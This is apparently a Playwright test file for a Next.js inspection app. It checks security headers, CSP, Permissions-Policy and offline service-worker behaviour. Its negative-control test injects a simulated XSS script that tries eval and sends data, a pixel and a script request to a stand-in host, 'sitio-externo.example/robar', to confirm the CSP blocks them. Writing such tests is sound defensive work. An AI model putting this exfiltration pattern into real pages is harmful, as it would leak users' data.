// Semana 9 · Tarea 2 (Carlos) — encabezados de seguridad y CSP en Chromium real contra `next start`.
//
// Mismo servidor que critical-inspection-flow.pw.ts: playwright.config.ts arranca el build de producción
// en el puerto 3100. Se comprueba lo que el navegador recibe y hace, no el código fuente:
// 1. Encabezados en páginas, API, /sw.js, manifiesto y robots.txt (HSTS solo detrás de HTTPS).
// 2. Cero violaciones de CSP mientras se usa la captura con cámara, foto y ubicación sintéticas; service
//    worker registrado; guardar sin red, recargar sin red y sincronizar al volver la conexión.
// 3. Control negativo: el mismo detector sí ve una violación real (eval, script y conexión a otro origen,
//    y la página dentro de un iframe). Sin este caso, «cero violaciones» podría ser un detector roto.

import { expect, test, type BrowserContext, type Page } from "@playwright/test";
import { HSTS_VALUE, PERMISSIONS_POLICY, REFERRER_POLICY, SERVICE_WORKER_CSP, buildCsp } from "../../src/lib/security/headers";

type Violation = { directive: string; blocked: string; page: string };

/**
 * Registra violaciones de CSP de todos los documentos del contexto (el evento `securitypolicyviolation`
 * llega a Node por una función expuesta, así sobrevive a recargas) y los avisos de consola de páginas y
 * del service worker. Ni el script inicial ni la función expuesta están sujetos a la CSP de la página.
 */
async function watchCsp(context: BrowserContext) {
  const violations: Violation[] = [];
  const consoleErrors: string[] = [];
  await context.exposeFunction("__reportCspViolation", (violation: Violation) => violations.push(violation));
  await context.addInitScript(() => {
    document.addEventListener("securitypolicyviolation", (event) => {
      const report = (window as unknown as { __reportCspViolation: (violation: unknown) => void }).__reportCspViolation;
      report({ directive: event.effectiveDirective || event.violatedDirective, blocked: event.blockedURI, page: location.pathname });
    });
  });
  context.on("console", (message) => {
    if (/Content Security Policy|Permissions-Policy|Refused to/i.test(message.text())) consoleErrors.push(message.text());
  });
  return { violations, consoleErrors };
}

const notice = (page: Page) => page.getByTestId("capture-notice");
const localList = (page: Page) => page.getByRole("list", { name: "Inspecciones locales pendientes y en conflicto" });

async function expectCaptureReady(page: Page) {
  await expect(notice(page)).toHaveText(/^(Captura local lista\.|Sincronización terminada\.)$/);
}

async function fillAndSave(page: Page, lab: string) {
  await page.getByLabel("Laboratorio sintético").fill(lab);
  await page.getByLabel("Responsable sintético").fill("Técnica sintética SEC");
  await page.getByLabel("Estado").selectOption("attention");
  await page.getByLabel("Hallazgos").fill("1");
  await page.getByLabel("Resumen sintético").fill("Registro sintético para comprobar encabezados y CSP.");
  await page.getByRole("button", { name: "Guardar sin conexión" }).click();
}

test.describe("E2E (Chromium) · encabezados de seguridad y CSP", () => {
  test("encabezados en páginas, API, service worker, manifiesto y robots.txt", async ({ request }) => {
    for (const pathname of ["/", "/inspecciones", "/inspecciones/inspection-001", "/offline"]) {
      const response = await request.get(pathname);
      expect(response.status(), pathname).toBe(200);
      const headers = response.headers();
      expect(headers["content-security-policy"], pathname).toBe(buildCsp({ production: true }));
      expect(headers["x-content-type-options"], pathname).toBe("nosniff");
      expect(headers["referrer-policy"], pathname).toBe(REFERRER_POLICY);
      expect(headers["permissions-policy"], pathname).toBe(PERMISSIONS_POLICY);
      expect(headers["cross-origin-opener-policy"], pathname).toBe("same-origin");
      expect(headers["x-frame-options"], pathname).toBe("DENY");
      expect(headers["x-powered-by"], pathname).toBeUndefined();
      expect(headers["strict-transport-security"], `${pathname}: sin HTTPS no se envía HSTS`).toBeUndefined();
    }

    // Detrás de un proxy con TLS (Vercel, Nginx) la petición llega con X-Forwarded-Proto: https.
    const viaHttps = await request.get("/", { headers: { "X-Forwarded-Proto": "https" } });
    expect(viaHttps.headers()["strict-transport-security"]).toBe(HSTS_VALUE);

    const api = await request.get("/api/inspecciones");
    expect(api.status()).toBe(200);
    expect(api.headers()["cache-control"]).toBe("no-store");
    expect(api.headers()["content-type"]).toContain("application/json");
    expect(api.headers()["x-content-type-options"]).toBe("nosniff");

    const worker = await request.get("/sw.js");
    expect(worker.status()).toBe(200);
    expect(worker.headers()["content-type"]).toMatch(/^(?:application|text)\/javascript/);
    expect(worker.headers()["cache-control"]).toBe("no-cache");
    expect(worker.headers()["content-security-policy"]).toBe(SERVICE_WORKER_CSP);

    const manifest = await request.get("/manifest.webmanifest");
    expect(manifest.status()).toBe(200);
    expect(manifest.headers()["content-type"]).toContain("application/manifest+json");
    expect(await manifest.json()).toMatchObject({ start_url: "/", scope: "/", display: "standalone" });

    const robots = await request.get("/robots.txt");
    expect(robots.status()).toBe(200);
    expect(robots.headers()["content-type"]).toContain("text/plain");
    const rules = await robots.text();
    expect(rules).toMatch(/^Disallow: \/api\/$/m);
    expect(rules).toMatch(/^Disallow: \/inspecciones$/m);
  });

  test("sin violaciones de CSP al capturar con cámara, foto y ubicación; worker registrado y flujo sin red", async ({ page, context }, testInfo) => {
    const lab = `Laboratorio Sintético SEC-${testInfo.testId.slice(0, 8)}-${Date.now()}`;
    const csp = await watchCsp(context);
    // Solo en este caso se conceden permisos: así se prueba que Permissions-Policy deja usar cámara y
    // ubicación al propio origen. El micrófono también se concede, y aun así la política lo bloquea.
    await context.grantPermissions(["camera", "geolocation", "microphone"]);
    await context.setGeolocation({ latitude: 18.4614, longitude: -97.3926, accuracy: 25 }); // coordenada sintética

    // Primera visita con red: el worker se instala y toma control; la segunda carga ya pasa por él.
    await page.goto("/inspecciones");
    await expectCaptureReady(page);
    await page.evaluate(() => navigator.serviceWorker.ready.then(() => undefined));
    await page.waitForFunction(() => navigator.serviceWorker.controller !== null);
    expect(await page.evaluate(() => navigator.serviceWorker.controller?.scriptURL)).toMatch(/\/sw\.js$/);
    await page.reload();
    await expectCaptureReady(page);

    // Permissions-Policy visto por la página: cámara y ubicación sí, micrófono no.
    const allowed = await page.evaluate(() => {
      const policy = (document as unknown as { featurePolicy?: { allowsFeature(feature: string): boolean } }).featurePolicy;
      return ["camera", "geolocation", "microphone"].map((feature) => policy?.allowsFeature(feature) ?? null);
    });
    expect(allowed).toEqual([true, true, false]);
    const microphone = await page.evaluate(() =>
      navigator.mediaDevices.getUserMedia({ audio: true }).then(
        (stream) => { stream.getTracks().forEach((track) => track.stop()); return "permitido"; },
        (error: Error) => error.name,
      ),
    );
    expect(microphone).toBe("NotAllowedError");

    // Cámara en vivo (dispositivo falso de Chromium): la foto pasa por canvas y se muestra como data URL.
    await page.getByRole("button", { name: "Abrir cámara" }).click();
    await expect(page.getByLabel("Vista previa de la cámara")).toBeVisible();
    await page.waitForFunction(() => {
      const video = document.querySelector("video");
      return Boolean(video && video.videoWidth > 0);
    });
    await page.getByRole("button", { name: "Capturar foto" }).click();
    await expect(page.getByTestId("photo-status")).toHaveText(/^Foto adjunta: \d+ × \d+ px, \d+ KB, sin metadatos\.$/);
    await expect(page.getByRole("img", { name: "Foto de evidencia adjunta a la inspección" })).toBeVisible();

    await page.getByRole("button", { name: "Agregar ubicación aproximada" }).click();
    await expect(page.getByTestId("location-status")).toHaveText(/^Ubicación aproximada agregada \(±\d+ m\)\.$/);

    // Sin red: guardar, recargar (la responde el worker, con la misma CSP) y reconectar.
    await context.setOffline(true);
    await fillAndSave(page, lab);
    await expect(localList(page).getByRole("listitem")).toHaveText([`${lab} — Pendiente de sincronizar · con foto y con ubicación aproximada`]);
    const reloaded = await page.reload();
    expect(reloaded?.fromServiceWorker()).toBe(true);
    expect(reloaded?.headers()["content-security-policy"]).toBe(buildCsp({ production: true }));
    await expect(localList(page).getByRole("listitem")).toHaveText([`${lab} — Pendiente de sincronizar · con foto y con ubicación aproximada`]);
    await context.setOffline(false);
    await expect(notice(page)).toHaveText("Sincronización completada. 1 inspección enviada al servidor.");
    await expect(localList(page)).toHaveCount(0);

    expect(csp.violations).toEqual([]);
    expect(csp.consoleErrors).toEqual([]);
  });

  test("control negativo: un script inyectado corre ('unsafe-inline'), pero no puede usar eval ni salir del origen", async ({ page, context, baseURL }) => {
    const csp = await watchCsp(context);
    await page.goto("/offline");

    // Simula una inyección (XSS) que logró insertar un <script> en línea. Con 'unsafe-inline' el script
    // corre —es el costo aceptado de la decisión—, pero la CSP le niega eval, código de otro origen y
    // cualquier conexión o imagen hacia fuera (exfiltración).
    await page.evaluate(() => {
      const probe = document.createElement("output");
      probe.id = "sonda-xss";
      document.body.appendChild(probe);
      const injected = document.createElement("script");
      injected.textContent = `
        const out = document.getElementById("sonda-xss").dataset;
        out.inline = "ejecutado";
        try { out.eval = String(eval("1 + 1")); } catch (error) { out.eval = error.name; }
        fetch("https://sitio-externo.example/robar", { method: "POST", mode: "no-cors", body: "dato sintético" })
          .then(() => { out.fetch = "enviado"; }, (error) => { out.fetch = error.name; });
        const image = new Image();
        image.onload = () => { out.image = "cargada"; };
        image.onerror = () => { out.image = "bloqueada"; };
        image.src = "https://sitio-externo.example/pixel.gif?dato=sintetico";
        const script = document.createElement("script");
        script.onload = () => { out.script = "cargado"; };
        script.onerror = () => { out.script = "bloqueado"; };
        script.src = "https://sitio-externo.example/inyectado.js";
        document.head.appendChild(script);
      `;
      // Fuera de page.evaluate: el protocolo de DevTools permite eval durante su propia evaluación, así
      // que la inserción se programa como una tarea normal de la página, igual que una inyección real.
      setTimeout(() => document.body.appendChild(injected), 0);
    });

    await expect
      .poll(() => page.evaluate(() => ({ ...document.getElementById("sonda-xss")?.dataset })))
      .toEqual({ inline: "ejecutado", eval: "EvalError", fetch: "TypeError", image: "bloqueada", script: "bloqueado" });
    await expect
      .poll(() => [...new Set(csp.violations.map((violation) => violation.directive))].sort())
      .toEqual(["connect-src", "img-src", "script-src", "script-src-elem"]);
    expect(csp.violations.every((violation) => violation.page === "/offline")).toBe(true);

    // frame-ancestors 'none' (y X-Frame-Options: DENY): ninguna página puede mostrar la aplicación en un iframe.
    await page.setContent(`<iframe title="intento de encuadre" src="${baseURL}/offline"></iframe>`);
    await expect.poll(() => csp.consoleErrors.some((text) => text.includes("frame-ancestors"))).toBe(true);
    const framed = page.frames().find((frame) => frame !== page.mainFrame());
    expect(await framed?.locator("h1", { hasText: "Sin conexión" }).count()).toBe(0);
  });
});
